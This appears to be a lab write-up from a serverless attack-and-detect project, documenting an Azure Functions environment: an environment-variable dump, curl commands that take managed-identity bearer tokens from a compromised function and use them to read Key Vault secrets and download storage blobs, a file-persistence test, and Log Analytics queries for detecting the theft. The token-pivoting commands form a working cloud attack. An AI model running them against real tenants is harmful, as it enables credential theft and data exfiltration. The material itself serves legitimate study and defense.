# Azure Consumption Execution Environment

Running under a consumption based Azure function (cold starts). Included a SP attached identity to the function for MSI testing.

## Execution Environment

```
id

uid=0(root) gid=0(root) groups=0(root)

# This varies as an older deployment had this result:

uid=1000(app) gid=1000(app) groups=1000(app)
```

```
whoami

root
```

```
pwd

/
```

```
ls

FuncExtensionBundles
appsvctmp
azure-functions-host
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

```
cat /etc/os-release

PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
VERSION_CODENAME=stretch
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

```
env

HASH=abc123
https_only=true
PLATFORM_VERSION=87.0.7.83
WEBSITE_INSTANCE_ID=2120174d611510bdf6ad494d55d9c98484f6a813d5b363a6244556f9f3045668
DOTNET_USE_POLLING_FILE_WATCHER=true
HOSTNAME=4059deb9fe79
AzureWebJobsStorage=DefaultEndpointsProtocol=https;AccountName=abc123;AccountKey=abc123;EndpointSuffix=core.windows.net
SHLVL=1
IDENTITY_HEADER=28ab5f3d-aa55-4270-a102-958c26dfec1a
HOME=/home
WEBSITE_RESOURCE_GROUP=cougar
WEBSITE_CORS_SUPPORT_CREDENTIALS=False
APPSETTING_https_only=true
DIAGNOSTIC_LOGS_MOUNT_PATH=/var/log/diagnosticLogs
DOTNET_RUNNING_IN_CONTAINER=true
APPSETTING_AzureWebJobsStorage=DefaultEndpointsProtocol=https;AccountName=abc123;AccountKey=abc123;EndpointSuffix=core.windows.net
ScmType=None
APPSETTING_HASH=abc123
WEBSITE_HOSTNAME=abc123.azurewebsites.net
WEBSITE_AUTH_LOGOUT_PATH=/.auth/logout
WEBSITE_ROLE_INSTANCE_ID=0
WEBSITE_RUN_FROM_PACKAGE=https://abc123.blob.core.windows.net/function-releases/./functionapp.zip?sv=2017-07-29&ss=b&srt=o&sp=r&se=2021-12-31&st=2019-01-01&spr=https&sig=abc123
AzureWebJobsScriptRoot=/home/site/wwwroot
WEBSITE_AUTH_ENCRYPTION_KEY=ABC123
APPSETTING_WEBSITE_AUTH_LOGOUT_PATH=/.auth/logout
_=/azure-functions-host/Microsoft.Azure.WebJobs.Script.WebHost
APPSETTING_WEBSITE_RUN_FROM_PACKAGE=https://abc123.blob.core.windows.net/function-releases/./functionapp.zip?sv=2017-07-29&ss=b&srt=o&sp=r&se=2021-12-31&st=2019-01-01&spr=https&sig=abc123
WEBSITE_SITE_NAME=abc123
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
FUNCTIONS_EXTENSION_VERSION=beta
MACHINEKEY_DecryptionKey=abc123
WEBSITE_AUTH_AUTO_AAD=False
FUNCTION_APP_EDIT_MODE=readonly
APPSETTING_WEBSITE_SITE_NAME=abc123
APPSETTING_FUNCTIONS_EXTENSION_VERSION=beta
MSI_ENDPOINT=http://172.16.1.3:8081/msi/token
WEBSITE_AUTH_ENABLED=False
APPSETTING_FUNCTION_APP_EDIT_MODE=readonly
MSI_SECRET=ABC123
APPSETTING_WEBSITE_AUTH_AUTO_AAD=False
FUNCTIONS_WORKER_RUNTIME=dotnet
AzureWebJobsDashboard=DefaultEndpointsProtocol=https;AccountName=abc123;AccountKey=abc123;EndpointSuffix=core.windows.net
APPSETTING_WEBSITE_AUTH_ENABLED=False
WEBSITE_OWNER_NAME=47d488d2-f662-46c2-8183-8fce2aefa6aa+Cougar-CentralUSwebspace
APPSETTING_FUNCTIONS_WORKER_RUNTIME=dotnet
WEBSITE_CORS_ALLOWED_ORIGINS=https://functions.azure.com,https://functions-staging.azure.com,https://functions-next.azure.com
APPSETTING_AzureWebJobsDashboard=DefaultEndpointsProtocol=https;AccountName=abc123;AccountKey=abc123;EndpointSuffix=core.windows.net
WEBSITE_SLOT_NAME=Production
IDENTITY_ENDPOINT=http://172.16.1.3:8081/msi/token
PWD=/
ASPNETCORE_URLS=http://*:80
COMPUTERNAME=RD0003FF6441B7
APPSVC_RUN_ZIP=FALSE
FUNCTIONS_LOGS_MOUNT_PATH=/var/log/functionsLogs
SSH_PORT=2222
APPSETTING_WEBSITE_SLOT_NAME=Production
APPSETTING_ScmType=None
WEBSITE_AUTH_SIGNING_KEY=ABC123
```

```
ls -al /home/site/wwwroot

total 127
drwxrwxr-x  7 nobody nogroup      0 Mar 25 06:05 .
drwxrwxrwx  2 nobody nogroup      0 Mar 25 06:33 ..
drwxrwxr-x  3 nobody nogroup      0 Mar 25 06:05 Cougar
-rw-r--r--  1 nobody nogroup 128384 Jan  1  2049 Cougar.deps.json
-rw-r--r--  1 nobody nogroup    158 Jan  1  2049 appsettings.json
drwxrwxr-x 67 nobody nogroup      0 Mar 25 06:05 bin
-rw-r--r--  1 nobody nogroup     26 Jan  1  2049 host.json
```
ls -al /home/ASP.NET
total 0
drwxrwxrwx 2 nobody nogroup 0 Mar 25 06:13 .
drwxrwxrwx 2 nobody nogroup 0 Mar 25 06:15 ..
drwxrwxrwx 2 nobody nogroup 0 Mar 25 06:13 DataProtection-Keys

ls -al /home/ASP.NET/DataProtection-Keys

total 4
drwxrwxrwx 2 nobody nogroup    0 Mar 25 06:13 .
drwxrwxrwx 2 nobody nogroup    0 Mar 25 06:13 ..
-rwxrwxrwx 1 nobody nogroup 1000 Mar 25 06:13 key-04e38819-2f49-4339-8c5f-49cedad4f1f6.xml
```

```
cat /home/ASP.NET/DataProtection-Keys/key-*.xml

<?xml version="1.0" encoding="utf-8"?>
<key id="76a45126-4f5f-4f5f-8dbd-a243fa6a8cd5" version="1">
  <creationDate>2019-12-23T19:22:56.6421802Z</creationDate>
  <activationDate>2019-12-23T19:22:56.6101845Z</activationDate>
  <expirationDate>2020-03-22T19:22:56.6101845Z</expirationDate>
  <descriptor deserializerType="Microsoft.AspNetCore.DataProtection.AuthenticatedEncryption.ConfigurationModel.AuthenticatedEncryptorDescriptorDeserializer, Microsoft.AspNetCore.DataProtection, Version=2.2.0.0, Culture=neutral, PublicKeyToken=adb9793829ddae60">
    <descriptor>
      <encryption algorithm="AES_256_CBC" />
      <validation algorithm="HMACSHA256" />
      <masterKey p4:requiresEncryption="true" xmlns:p4="http://schemas.asp.net/2015/03/dataProtection">
        <!-- Warning: the key below is in an unencrypted form. -->
        <value>ABCq123==</value>
      </masterKey>
    </descriptor>
  </descriptor>
```

Querying the MSI service for bearer tokens:

```
env | grep 'MSI'

MSI_ENDPOINT=http://172.16.1.3:8081/msi/token
MSI_SECRET=ABC123
```

Research on MSI architecture: https://techcommunity.microsoft.com/t5/Azure-Developer-Community-Blog/Understanding-Azure-MSI-Managed-Service-Identity-tokens-caching/ba-p/337406

```bash
curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://storage.azure.com/"
echo
```

Response is a JWT that can be used to access the storage service for 8 hours. Example of the decoded token:

```json
{
    "aud": "https://storage.azure.com/",
    "iss": "https://sts.windows.net/ad0e23cd-ec45-4fba-b7ea-cd29f4795e78/",
    "iat": 1577132754,
    "nbf": 1577132754,
    "exp": 1577161854,
    "aio": "42VgYAjYV+C7ff6MdeqBGx5Y7V2zFQA=",
    "appid": "abc-123",
    "appidacr": "2",
    "idp": "https://sts.windows.net/ad0e23cd-ec45-4fba-b7ea-cd29f4795e78/",
    "oid": "abc-123",
    "sub": "abc-123",
    "tid": "abc-123
    "uti": "9bg56odteUKeWDv7MoeOAA",
    "ver": "1.0",
    "xms_mirid": "/subscriptions/abc-123/resourcegroups/pumaprey-cougar/providers/Microsoft.Web/sites/pumapreycougar"
}
```

## Token Pivoting

### Azure Key Vault

[API Documentation](https://docs.microsoft.com/en-us/rest/api/keyvault/)

From the compromised function, request a Bearer token for the vault service:

```bash
curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://vault.azure.net"
echo
```

List the secrets:

```bash
export BEARER_TOKEN=<SET TOKEN VALUE>
export VAULT_NAME=cougar$TF_VAR_UniqueString
curl -s -H "Authorization: Bearer $BEARER_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0"
```

List the versions for the secret:

```bash
export COUGAR_DB_PASS=$(curl -s -H "Authorization: Bearer $BEARER_TOKEN" "https://$VAULT_NAME.vault.azure.net/secrets?api-version=7.0" | jq -r '.value[0].id' )
curl -s -H "Authorization: Bearer $BEARER_TOKEN" "$COUGAR_DB_PASS/versions?api-version=7.0"
```

Read a secret value:

```bash
export COUGAR_DB_PASS_V0=$(curl -s -H "Authorization: Bearer $BEARER_TOKEN" "$COUGAR_DB_PASS/versions?api-version=7.0" | jq -r '.value[0].id')
curl -H "Authorization: Bearer $BEARER_TOKEN" "$COUGAR_DB_PASS_V0?api-version=7.0"
```

### Azure Storage

[API Documentation](https://docs.microsoft.com/en-us/rest/api/storageservices/)

From the compromised function, request a Bearer token for the storage service:

```bash
curl -s -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://storage.azure.com/"
echo
```

List the storage account containers:

```bash
export BEARER_TOKEN=<SET TOKEN VALUE>
export STORAGE_ACCOUNT="cougarassets$TF_VAR_UniqueString"
curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/?comp=list" | xmllint --format -
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults ServiceEndpoint="https://cougar<UNIQUE_STRING>.blob.core.windows.net/">
  <Containers>
    <Container>
      <Name>azure-webjobs-hosts</Name>
      <Properties>
        <Last-Modified>Thu, 19 Mar 2020 17:52:51 GMT</Last-Modified>
        <Etag>"0x8D7CC2E584F1AF9"</Etag>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
        <HasLegalHold>false</HasLegalHold>
      </Properties>
    </Container>
    <Container>
      <Name>azure-webjobs-secrets</Name>
      <Properties>
        <Last-Modified>Thu, 19 Mar 2020 17:52:47 GMT</Last-Modified>
        <Etag>"0x8D7CC2E559F352A"</Etag>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
        <HasLegalHold>false</HasLegalHold>
      </Properties>
    </Container>
    <Container>
      <Name>function-releases</Name>
      <Properties>
        <Last-Modified>Thu, 19 Mar 2020 17:50:20 GMT</Last-Modified>
        <Etag>"0x8D7CC2DFE3B3EE4"</Etag>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
        <HasLegalHold>false</HasLegalHold>
      </Properties>
    </Container>
    <Container>
      <Name>scm-releases</Name>
      <Properties>
        <Last-Modified>Thu, 19 Mar 2020 17:50:31 GMT</Last-Modified>
        <Etag>"0x8D7CC2E049DE518"</Etag>
        <LeaseStatus>unlocked</LeaseStatus>
        <LeaseState>available</LeaseState>
        <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
        <HasLegalHold>false</HasLegalHold>
      </Properties>
    </Container>
  </Containers>
  <NextMarker/>
</EnumerationResults>
```

List the blobs in the assets container:

```bash
curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/assets?restype=container&comp=list"
```

Download our target cougar image:

```bash
curl -s -H "x-ms-version: 2017-11-09" -H "Authorization: Bearer $BEARER_TOKEN" "https://$STORAGE_ACCOUNT.blob.core.windows.net/assets/cougar.jpg" --output ~/Downloads/cougar.jpg
```

## Persistence

Persisting a malware payload into the runtime environment. Unlike AWS, some directories other than `/tmp` are writable while the source directory is not:

```bash
mount

none on / type aufs (rw,relatime,si=3885b43376db3940,dio,dirperm1)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,nodev,size=65536k,mode=755,uid=231072,gid=231072)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=231077,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755,uid=231072,gid=231072)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,uid=231072,gid=231072)
/dev/sda1 on /appsvctmp type ext4 (rw,relatime,errors=remount-ro,data=ordered)
//10.0.176.14/volume-5-default/35c6e87611d499b626dd/4837afd00de2424f847ae0d4cd8b7402 on /home type cifs (rw,relatime,vers=3.0,sec=ntlmssp,cache=strict,username=dummyadmin,domain=RD281878EC704F,uid=0,noforceuid,gid=0,noforcegid,addr=10.0.176.14,file_mode=0777,dir_mode=0777,nounix,serverino,mapposix,mfsymlinks,noperm,rsize=1048576,wsize=1048576,echo_interval=60,actimeo=1)
/dev/sda1 on /home/site/wwwroot type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/sda1 on /var/ssl type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/loop0p1 on /etc/resolv.conf type ext4 (rw,relatime,data=ordered)
/dev/loop0p1 on /etc/hostname type ext4 (rw,relatime,data=ordered)
/dev/loop0p1 on /etc/hosts type ext4 (rw,relatime,data=ordered)
fuse-zip on /home/site/wwwroot type fuse.fuse-zip (ro,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
/dev/sda1 on /var/log/functionsLogs type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/sda1 on /var/log/diagnosticLogs type ext4 (rw,relatime,errors=remount-ro,data=ordered)
udev on /dev/null type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
udev on /dev/random type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
udev on /dev/full type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
udev on /dev/tty type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
udev on /dev/zero type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
udev on /dev/urandom type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
proc on /proc/bus type proc (ro,nodev,relatime)
proc on /proc/fs type proc (ro,nodev,relatime)
proc on /proc/irq type proc (ro,nodev,relatime)
proc on /proc/sys type proc (ro,nodev,relatime)
proc on /proc/sysrq-trigger type proc (ro,nodev,relatime)
tmpfs on /proc/acpi type tmpfs (ro,nodev,relatime,uid=231072,gid=231072)
udev on /proc/kcore type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
udev on /proc/keys type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
udev on /proc/timer_list type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
udev on /proc/timer_stats type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
udev on /proc/sched_debug type devtmpfs (rw,nosuid,relatime,size=959488k,nr_inodes=239872,mode=755)
tmpfs on /proc/scsi type tmpfs (ro,nodev,relatime,uid=231072,gid=231072)
tmpfs on /sys/firmware type tmpfs (ro,nodev,relatime,uid=231072,gid=231072)

cat "Malware" > /home/site/wwwroot/malware.sh # Silently fails.
cat /home/site/wwwroot/malware.sh # Nothing.
ls /home/site/wwwroot

Cougar
Cougar.deps.json
appsettings.json
bin
host.json

echo "Malware" > /malware.sh
ls /malware.sh

/malware.sh

echo "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" > /malware.sh
cat /malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 1 minute:

```bash
cat /malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 2 minutes:

```bash
cat /malware.sh
X5O!P%@AP[4\PZX54(P^)7CC)7}-STANDARD-ANTIVIRUS-TEST-FILE!+H*
```

Waiting approximately 3 minutes:

Slowly started increasing the inactivity to 2, 3, 4, 5, and so on minutes. Finally, after 6 minutes of inactivity:

```bash
cat /malware.sh
cat: /malware.sh: No such file or directory
```

## Monitoring &amp; Incident Response

### Application Insights

Logs and telemetry are automatically sent to Application Insights. Interesting note: The key in the `env` vars is all you need to send forged metrics to the insights log. Let's query some information about the Cougar execution.

Insights query for Cougar invocations via the shutdown event:

```
traces
| where timestamp > ago(7d)
| where customDimensions.['EventId'] == "5"
| order by timestamp desc
| limit 50
```

Insights query for function access to the secret selecting only a few columns:

```
traces | where timestamp > ago(7d) | where customDimensions.["EventId"] == "8" | order by timestamp desc | project timestamp, cloud_RoleName, operation_Name, customDimensions ["EventId"], customDimensions["InvocationId"]
```

Counting the number of in

This can be run from the command line by installing the application insights and log analytics extensions:

```
az extension add -n application-insights
az extension add -n log-analytics
```

Then, run your query for normal function secret access using the following insights log query:

```
az monitor app-insights query -g pumaprey-cougar --app pumapreycougar20191219172 --analytics-query 'traces | where timestamp > ago(7d) | where customDimensions.["EventId"] == "8" | order by timestamp desc | project timestamp, cloud_RoleName, operation_Name, customDimensions ["EventId"], customDimensions["InvocationId"]' --offset 7D
```

Counting the number of standard function secret access logs can help identify anomalies as well. Appending a jq query to count the number of results returned:

```
az monitor app-insights query -g pumaprey-cougar --app pumapreycougar20191219172 --analytics-query 'traces | where timestamp > ago(7d) | where customDimensions.["EventId"] == "8" | order by timestamp desc | project timestamp, cloud_RoleName, operation_Name, customDimensions ["EventId"], customDimensions["InvocationId"]' --offset 7D | jq '.tables[0].rows | length'
```

Now we need to get to the heart of the audit data and find number to secret reads from ALL sources. From what I can tell, there is no centralized "CloudTrail / IAM Audit Log" service in Azure. At least in a non-enterprise AD account. Querying the key vault monitoring log, which is not enabled by default you will find this. NOTE: Azure Security Center did recommend enabling logging on the key vault to generate this data.

Viewing all actions taken against the `cougar-database-pass` secret:

```
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.KEYVAULT"
| where id_s contains "cougar-database-pass"
| order by TimeGenerated desc
```

A normal entry comes from a Microsoft owned IP address and the `azuresdk` client:

```
TimeGenerated: 1/20/2020, 1:34:52.309 AM
identityClaim: /subscriptions/#####/resourcegroups/pumaprey-cougar/providers/Microsoft.Web/sites/pumapreycougar
id_s: https://######.vault.azure.net/secrets/cougar-database-pass/3ee############
OperationName: SecretGet
ResultType: Success
CallerIPAddress: 40.81.2.152
clientinfo_s: azsdk-net-Security.KeyVault.Secrets/4.0.1+d9d93df6c75797a6027c125ab3ff61b2ac894102 (.NET Core 3.1.0; Linux 4.19.84-microsoft-standard #1 SMP Wed Nov 13 13:08:05 UTC 2019)
```

Extracting the tokens shows the attacker's caller IP and client information:

```
TimeGenerated: 1/20/2020, 2:58:58.262 AM
identityClaim: /subscriptions/#####/resourcegroups/pumaprey-cougar/providers/Microsoft.Web/sites/pumapreycougar
id_s: https://######.vault.azure.net/secrets/cougar-database-pass/3ee############
OperationName: SecretGet
ResultType: Success
CallerIPAddress: 95.025.143.109
clientinfo_s: curl/7.64.1
```

From the `az` CLI, this command will search the logs for `GetSecret` actions from the managed service identity.

```
az monitor log-analytics query --workspace 34ab64fe-8eab-4e31-9e85-7c1daaae020a --analytics-query 'AzureDiagnostics | where TimeGenerated > ago(7d) | where ResourceProvider == "MICROSOFT.KEYVAULT" | where id_s contains "cougar-database-pass" | where identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g == "0cbd41de-55c6-460d-b92b-837eddd0ea0d" | order by TimeGenerated desc | project TimeGenerated, OperationName, CallerIPAddress, clientInfo_s, ResultType'
```

Counting the total number of invocations using `jq`:

```
az monitor log-analytics query --workspace 34ab64fe-8eab-4e31-9e85-7c1daaae020a --analytics-query 'AzureDiagnostics | where TimeGenerated > ago(7d) | where ResourceProvider == "MICROSOFT.KEYVAULT" | where id_s contains "cougar-database-pass" | where identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g == "0cbd41de-55c6-460d-b92b-837eddd0ea0d"' | jq '. | length'
```

Looking for compromised bearer tokens can be accomplished with a query similar to the following:

NOTE: Maintenance will need to be done as the IP ranges from MS change. Or, on function start up, the current IP address could be registered in a backend cache / database. Or, even adjust this query on the fly.

```
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.KEYVAULT"
| where identity_claim_xms_mirid_s contains "/pumaprey-cougar/providers/Microsoft.Web/sites/pumapreycougar"
| where id_s contains "cougar-database-pass"
| where CallerIPAddress !contains "40."
| order by TimeGenerated desc
```

This only works for resources that have Diagnostics integration with Application Insights. The other resource in our demo, Azure Storage, at the time of this writing does not have native integration with Azure Monitor and Log Analytics. :(
  
To make this happen, you have to covert their log format to JSON and post the JSON data into Log Analytics to ingest the data. Projecting Q2 2020 before this is handled by the platform.

- [https://feedback.azure.com/forums/217298-storage/suggestions/33930541-make-it-possible-to-send-storage-analytics-logs](https://feedback.azure.com/forums/217298-storage/suggestions/33930541-make-it-possible-to-send-storage-analytics-logs)

- [https://azure.microsoft.com/en-us/blog/query-azure-storage-analytics-logs-in-azure-log-analytics/](https://azure.microsoft.com/en-us/blog/query-azure-storage-analytics-logs-in-azure-log-analytics/)

## VPC Configuration

Unable to configure the consumption based function to connect to a VPC on start up.

### VPC Endpoints

Unable to configure the consumption based function to connect to a VPC on start up.

## Cold Start Times

Running the following command a few times to see the cold versus warm start metrics. This will invoke the function without any reverse shell data (simulating starting and stopping the function), and retrieve the response time.

```bash
curl "https://cougar$TF_VAR_UniqueString.azurewebsites.net/api/cougar?code=YOUR_API_KEY" -s -o /dev/null -w "%{time_starttransfer}\n"
```

### No VPC Integration

Cold hits:

```
Request 1: 6.098226
Request 2: 4.072225
```

Warm hits:

```
Request 2: 0.344960
Request 3: 0.319494
Request 4: 0.284055
```

### With VPC Integration

This is not possible using the consumption plan. See the [Premium Plan][./PREMIUM.md] notes for load times in that environment.
